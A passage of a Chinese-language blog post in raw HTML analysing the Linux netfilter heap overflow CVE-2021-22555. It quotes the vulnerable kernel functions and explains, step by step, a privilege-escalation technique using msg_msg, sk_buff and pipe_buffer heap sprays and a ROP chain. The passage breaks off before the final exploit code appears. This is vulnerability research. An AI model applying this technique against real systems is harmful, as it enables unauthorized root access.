class="title">ct</span> =</span> (<span class="keyword">struct</span> compat_xt_entry_target *)t;</span><br><span class="line"><span class="type">int</span> pad, off = xt_compat_target_offset(target);</span><br><span class="line"><span class="type">u_int16_t</span> tsize = ct-&gt;u.user.target_size;</span><br><span class="line"><span class="type">char</span> name[<span class="keyword">sizeof</span>(t-&gt;u.user.name)];</span><br><span class="line"></span><br><span class="line">t = *dstptr;</span><br><span class="line"><span class="built_in">memcpy</span>(t, ct, <span class="keyword">sizeof</span>(*ct));</span><br><span class="line"><span class="keyword">if</span> (target-&gt;compat_from_user)</span><br><span class="line">target-&gt;compat_from_user(t-&gt;data, ct-&gt;data);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">memcpy</span>(t-&gt;data, ct-&gt;data, tsize - <span class="keyword">sizeof</span>(*ct));</span><br><span class="line">pad = XT_ALIGN(target-&gt;targetsize) - target-&gt;targetsize;</span><br><span class="line"><span class="keyword">if</span> (pad &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">memset</span>(t-&gt;data + target-&gt;targetsize, <span class="number">0</span>, pad);<span class="comment">// 漏洞产生点</span></span><br><span class="line"></span><br><span class="line">tsize += off;</span><br><span class="line">t-&gt;u.user.target_size = tsize;</span><br><span class="line">strlcpy(name, target-&gt;name, <span class="keyword">sizeof</span>(name));</span><br><span class="line">module_put(target-&gt;me);</span><br><span class="line"><span class="built_in">strncpy</span>(t-&gt;u.user.name, name, <span class="keyword">sizeof</span>(t-&gt;u.user.name));</span><br><span class="line"></span><br><span class="line">*size += off;</span><br><span class="line">*dstptr += tsize;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(xt_compat_target_from_user);</span><br></pre></td></tr></table></figure><p>理想情况下，应该是按照如下方式进行清零的，看起来好像没有什么问题？（下图例子中假设 targetsize 小于 8）</p><p><img src="https://s2.loli.net/2022/03/31/3jlPfpg2AMYoZrv.png" alt="image.png"></p><p><strong>但是 t-&gt;data 并不一定是 8 字节对齐的，而我们计算 pad 时却默认 t-&gt;data 应当 8 字节对齐</strong>，因此若 t-&gt;data 并非 8 字节对齐，而 pad 计算时向上与 8  字节对齐，<strong>就会导致越界写入数字节的 0 到相邻的下一个 object 中</strong></p><p><img src="https://s2.loli.net/2022/03/31/eS15WvRZuz8f6HU.png" alt="image.png"></p><p>这里笔者对公开的 exp 进行调试，可以看到的是 t-&gt;data <strong>确乎可以为一个非 8 字节对齐的地址，而此时 target-&gt;targetsize 再向上对 8 字节对齐，自然就会越界写到相邻下一 object 的开头</strong></p><p><img src="https://s2.loli.net/2022/03/31/NBqKxZEDsOmgc64.png" alt="image.png"></p><p>在 <code>xt_compat_match_from_user()</code> 中产生的漏洞逻辑相同，这里就不赘叙了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">xt_compat_match_from_user</span><span class="params">(<span class="keyword">struct</span> xt_entry_match *m, <span class="type">void</span> **dstptr,</span></span><br><span class="line"><span class="params">       <span class="type">unsigned</span> <span class="type">int</span> *size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">xt_match</span> *<span class="title">match</span> =</span> m-&gt;u.kernel.match;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">compat_xt_entry_match</span> *<span class="title">cm</span> =</span> (<span class="keyword">struct</span> compat_xt_entry_match *)m;</span><br><span class="line"><span class="type">int</span> pad, off = xt_compat_match_offset(match);</span><br><span class="line"><span class="type">u_int16_t</span> msize = cm-&gt;u.user.match_size;</span><br><span class="line"><span class="type">char</span> name[<span class="keyword">sizeof</span>(m-&gt;u.user.name)];</span><br><span class="line"></span><br><span class="line">m = *dstptr;</span><br><span class="line"><span class="built_in">memcpy</span>(m, cm, <span class="keyword">sizeof</span>(*cm));</span><br><span class="line"><span class="keyword">if</span> (match-&gt;compat_from_user)</span><br><span class="line">match-&gt;compat_from_user(m-&gt;data, cm-&gt;data);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">memcpy</span>(m-&gt;data, cm-&gt;data, msize - <span class="keyword">sizeof</span>(*cm));</span><br><span class="line">pad = XT_ALIGN(match-&gt;matchsize) - match-&gt;matchsize;</span><br><span class="line"><span class="keyword">if</span> (pad &gt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">memset</span>(m-&gt;data + match-&gt;matchsize, <span class="number">0</span>, pad); <span class="comment">// 漏洞产生点</span></span><br><span class="line"></span><br><span class="line">msize += off;</span><br><span class="line">m-&gt;u.user.match_size = msize;</span><br><span class="line">strlcpy(name, match-&gt;name, <span class="keyword">sizeof</span>(name));</span><br><span class="line">module_put(match-&gt;me);</span><br><span class="line"><span class="built_in">strncpy</span>(m-&gt;u.user.name, name, <span class="keyword">sizeof</span>(m-&gt;u.user.name));</span><br><span class="line"></span><br><span class="line">*size += off;</span><br><span class="line">*dstptr += msize;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(xt_compat_match_from_user);</span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>接下来我们来考虑如何利用这个越界写 0 的漏洞，现在公开的这一份 exp 利用 <code>msg_msg</code> 构造 UAF、利用 <code>sk_buff</code> 写入 object、利用 <code>pipe_buffer</code> 劫持 RIP，笔者认为这是一个很好的思路，所以后面笔者构造 exp 也会遵循同样的思路完成</p><blockquote><p>下面的图例大部分来自 <a href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html">Google 的 security research 博客</a>，非常感谢 Google 做出了如此简单易懂的图例！</p></blockquote><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Step-O-开始前的准备工作"><a href="#Step-O-开始前的准备工作" class="headerlink" title="Step.O 开始前的准备工作"></a>Step.O 开始前的准备工作</h3><p>为了触发到漏洞的路径，我们应当使用 <code>unshare()</code> 隔离出对应的的命名空间，同时为了提高堆喷的稳定性，我们将进程绑定到固定核心上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>)</span><br><span class="line">    errExit(<span class="string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>)</span><br><span class="line">    errExit(<span class="string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">CPU_ZERO(&amp;cpu_set);</span><br><span class="line">CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br></pre></td></tr></table></figure><blockquote><p>如果不隔离出独立命名空间的话<strong>便不会走到触发漏洞的路径</strong>，因为我们需要 <code>CAP_SYS_ADMIN</code> 权限，作为普通用户只能通过命名空间隔离进行获取</p></blockquote><h3 id="Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息"><a href="#Step-I-堆喷-msg-msg-，建立主从消息队列，构造重叠辅助消息" class="headerlink" title="Step.I 堆喷 msg_msg ，建立主从消息队列，构造重叠辅助消息"></a>Step.I 堆喷 <code>msg_msg</code> ，建立主从消息队列，构造重叠辅助消息</h3><p>现在我们有了一个堆上 off-by-one，我们该怎么利用呢？比较朴素的一种思想便是覆写一个头部为指针的结构体，利用 partial overwrite 使得两个这样的结构体的头部指针指向同一个结构体，<strong>从而实现 object overlapping</strong></p><p>那么选用什么样的结构体作为 victim 呢？这里我们选择使用 <code>msg_msg</code> 这一结构体，其长度可控，且开头正好是内核双向链表结构体，我们所能覆写的为其 next 指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当我们在一个消息队列上发送多个消息时，会形成如下结构：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难想到的是，我们可以在一开始时先创建多个消息队列，并分别在每一个消息队列上发送两条消息，形成如下内存布局，这里为了便利后续利用，第一条消息（主消息）的大小为 0x1000，第二条消息（辅助消息）的大小为 0x400：</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>之后我们读出其中几个消息队列的主消息，再利用 setsockopt 获取到我们刚释放的 <code>msg_msg</code> 结构体的空间</p><p><img src="https://s2.loli.net/2022/03/31/cJjVS59m8nvI4e2.png" alt="image.png"></p><p>这样就会导致 <code>xt_table_info</code> 结构体覆写到其相邻的主消息的 next 指针，从而导致<strong>在两个消息队列上存在两个主消息指向同一个辅助消息</strong></p><p><img src="https://s2.loli.net/2022/03/31/vOMedQBuFsiKlYD.png" alt="image.png"></p><p>我们可以通过在主从消息中放置对应的值来标识喷射的不同的消息队列，遍历读取所有队列来感知指向了同一辅助消息的两个队列</p><blockquote><p>利用 <code>MSG_COPY</code> 标志位可以读取消息队列上的消息而不释放，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-II-释放辅助消息，构造-UAF"><a href="#Step-II-释放辅助消息，构造-UAF" class="headerlink" title="Step.II 释放辅助消息，构造 UAF"></a>Step.II 释放辅助消息，构造 UAF</h3><p>此时我们将辅助消息释放掉，便能成功完成 UAF 的构建，此时<strong>我们仍能通过其中一个消息队列访问到该辅助消息对应 object，但实际上这个 object 已经在 freelist 上了</strong></p><p><img src="https://s2.loli.net/2022/03/31/nbw6aSFXIVEtDN4.png" alt="image.png"></p><h3 id="Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址"><a href="#Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址" class="headerlink" title="Step.III 堆喷 sk_buff 伪造辅助消息，泄露 UAF obj 地址"></a>Step.III 堆喷 <code>sk_buff</code> 伪造辅助消息，泄露 UAF obj 地址</h3><p>接下来我们考虑如何利用这个 UAF，因为其仍位于消息队列上所以我们考虑伪造 <code>msg_msg</code> 结构体进行后续的利用，这里我们选用另外一个常用来进行堆喷的结构体——<code>sk_buff</code>，类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，<strong>用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>至于这个结构体的分配与释放也是十分简单，<strong>sk_buff 在内核网络协议栈中代表一个「包」，</strong>我们不难想到的是<strong>我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放</strong>，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作</p><p>接下来我们考虑如何通过伪造 <code>msg_msg</code> 结构体完成信息泄露，我们不难想到的是可以伪造一个 <code>msg_msg</code> 结构体，将其 <code>m_ts</code> 域设为一个较大值，<strong>从而越界读取到相邻辅助消息的 header，泄露出堆上地址</strong></p><p><img src="https://s2.loli.net/2022/03/31/CxE24knZqyXPgHj.png" alt="image.png"></p><p>我们泄露出来的是哪个地址？让我们重新将目光放回到消息队列的结构上：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>我们不难知道的是，该辅助消息的 prev 指针指向其主消息，而该辅助消息的 next 指针指向该消息队列的 <code>msg_queue</code> 结构，这是目前我们已知的两个“堆上地址”</p><p>接下来我们伪造 <code>msg_msg-&gt;next</code>，<strong>将其指向我们的 UAF object 相邻的辅助消息对应的主消息头部往前，从而读出该主消息的头部，泄露出对应的辅助消息的地址</strong>，有了这个辅助消息的地址，再减去 0x400 <strong>便是我们的 UAF 对象的地址</strong></p><blockquote><p>通过伪造 msg_msg-&gt;next 可以完成任意地址读，参见<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">这里</a></p></blockquote><h3 id="Step-IV-堆喷-pipe-buffer，泄露内核基址"><a href="#Step-IV-堆喷-pipe-buffer，泄露内核基址" class="headerlink" title="Step.IV 堆喷 pipe_buffer，泄露内核基址"></a>Step.IV 堆喷 <code>pipe_buffer</code>，泄露内核基址</h3><p>现在我们已知了可控区域的地址，接下来让我们来考虑泄露内核 .text 段的基址，以及如何劫持 RIP 完成提权</p><p>之前我们为什么将辅助消息的大小设为 0x400？除了方便对齐以外，还有一层考虑就是这个大小刚好有一个十分实用的结构体 <code>pipe_buffer</code> 数组，<strong>既能帮我们泄露内核代码段基址，也能帮我们劫持 RIP</strong></p><p>当我们创建一个管道时，在内核中会生成数个连续的 <code>pipe_buffer</code> 结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>pipe_buffer</code> 中存在一个函数表成员 <code>pipe_buf_operations</code> ，其指向内核中的函数表 <code>anon_pipe_buf_ops</code>，若我们能够将其读出，便能泄露出内核基址，操作如下：</p><ul><li>利用 <code>sk_buff</code> 修复辅助消息，之后从消息队列中接收该辅助消息，此时该 object 重回 slub 中，但 <code>sk_buff</code> 仍指向该 object</li><li>喷射 <code>pipe_buffer</code>，之后再接收 <code>sk_buff</code> 数据包，<strong>我们便能读出 pipe_buffer 上数据，泄露内核基址</strong></li></ul><h3 id="Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权"><a href="#Step-V-伪造-pipe-buffer，构造-ROP，劫持-RIP，完成提权" class="headerlink" title="Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权"></a>Step.V 伪造 pipe_buffer，构造 ROP，劫持 RIP，完成提权</h3><p>当我们关闭了管道的两端时，会触发 <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> 这一指针，而 UAF object 的地址对我们而言是已知的，因此<strong>我们可以直接利用 sk_buff 在 UAF object 上伪造函数表与构造 ROP chain，再选一条足够合适的 gadget 完成栈迁移便能劫持 RIP 完成提权</strong></p><p><img src="https://s2.loli.net/2022/03/31/RW6HFoLJf1AE5kd.png" alt="image.png"></p><h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span 